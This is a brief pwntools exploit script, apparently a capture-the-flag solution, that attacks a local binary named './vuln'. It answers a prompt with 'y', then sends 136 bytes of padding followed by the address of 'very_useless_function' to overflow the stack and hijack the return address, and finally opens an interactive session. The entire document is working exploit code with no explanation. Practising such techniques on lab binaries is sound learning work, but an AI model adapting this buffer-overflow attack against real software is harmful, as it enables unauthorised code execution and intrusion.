from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

garbage = b'a'*136
target = p64(elf.symbols['very_useless_function'])
msgin = garbage + target
p.sendline(b'y')
p.sendline(msgin)
p.interactive()
